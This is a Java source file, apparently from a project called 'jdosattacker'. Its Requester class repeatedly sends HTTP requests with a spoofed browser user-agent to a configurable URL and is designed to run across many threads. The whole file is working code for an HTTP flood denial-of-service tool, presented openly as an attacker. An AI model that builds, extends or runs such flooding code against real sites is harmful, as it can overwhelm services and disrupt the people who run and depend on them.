package com.anas.jdosattacker.request;

import com.anas.jdosattacker.FieldException;

import javax.net.ssl.HttpsURLConnection;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

public class Requester implements Runnable {
    private static int connectTimeout = 5000;
    private static String userAgent,
            requestMethod;
    private static String url;
    private static int reqNumber;

    // Initialize the static variables
    static {
        userAgent = """
            Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
             Chrome/60.0.3112.113 Safari/537.36
             """.replaceAll("\n", "");
        setRequestMethod(null); // null means GET
    }

    public static boolean hasRequirementEmptyFields() {
        return (Requester.url == null || Requester.url.isBlank()) ||
                Requester.userAgent.isBlank() ||
                Requester.requestMethod.isBlank() ||
                Requester.connectTimeout == 0 ||
                Requester.reqNumber == 0;
    }

    protected void sendRequest() {
        try {
            HttpURLConnection connection = switch (url.substring(0, 7)) {
                case "http://" -> (HttpURLConnection) new URL(url).openConnection();
                case "https:/" -> (HttpsURLConnection) new URL(url).openConnection();
                default -> throw new IllegalArgumentException("Invalid URL");
            };
            connection.setRequestMethod(requestMethod);
            connection.setRequestProperty("User-Agent", userAgent);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setDoOutput(false);
            connection.setConnectTimeout(connectTimeout);
            connection.connect();
            int responseCode = connection.getResponseCode();
            System.out.printf("%15s | %16s |  %20s\n", responseCode +
                    (responseCode == HttpsURLConnection.HTTP_OK ? " [OK]" : " [FAIL]"),
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms");
        } catch (IOException e) {
            System.out.printf("%15s | %16s |  %20s \n", "[FAIL]",
                    Thread.currentThread().getName(),
                    System.currentTimeMillis() + "ms");
        }
    }

    private void startRequests() {
        for (int i = 0; i < reqNumber; i++) {
            sendRequest();
        }
    }



    public static int getReqNumber() {
        return reqNumber;
    }

    public static void setReqNumber(int reqNumber) throws FieldException {
        if (reqNumber < 1) {
            throw new FieldException("Number of requests must be greater than 0");
        }
        Requester.reqNumber = reqNumber;
    }

    public static void setReqNumber(String reqNumber) throws FieldException {
        try {
            int numberOfRequests = Integer.parseInt(reqNumber);
            Requester.setReqNumber(numberOfRequests);
        } catch (NumberFormatException e) {
            throw new FieldException("Number of requests must be a number");
        }
    }

    public static String getUrl() {
        return url;
    }

    public static void setUrl(String url) throws FieldException {
        if (url == null || url.isBlank()) {
            throw new FieldException("URL cannot be empty");
        }
        if (!url.startsWith("http://") && !url.startsWith("https://")) {
            throw new FieldException("URL must start with http:// or https://");
        }
        Requester.url = url;
    }

    public static String getUserAgent() {
        return userAgent;
    }

    public static void setUserAgent(String userAgent) {
        Requester.userAgent = userAgent;
    }

    public static String getRequestMethod() {
        return requestMethod;
    }

    public static void setRequestMethod(String requestMethod) {
        if (requestMethod == null || requestMethod.isBlank()) {
            requestMethod = "GET";
        }
        Requester.requestMethod = requestMethod;
    }

    public static int getConnectTimeout() {
        return connectTimeout;
    }

    public static void setConnectTimeout(int connectTimeout) throws FieldException {
        if (connectTimeout < 1) {
            throw new FieldException("Timeout must be greater than 0");
        }
        Requester.connectTimeout = connectTimeout;
    }

    public static void setConnectTimeout(String connectTimeout) throws FieldException {
        try {
            int timeout = Integer.parseInt(connectTimeout);
            Requester.setConnectTimeout(timeout);
        } catch (NumberFormatException e) {
            throw new FieldException("Timeout must be a number");
        }
    }

    @Override
    public void run() {
        startRequests();
    }
}
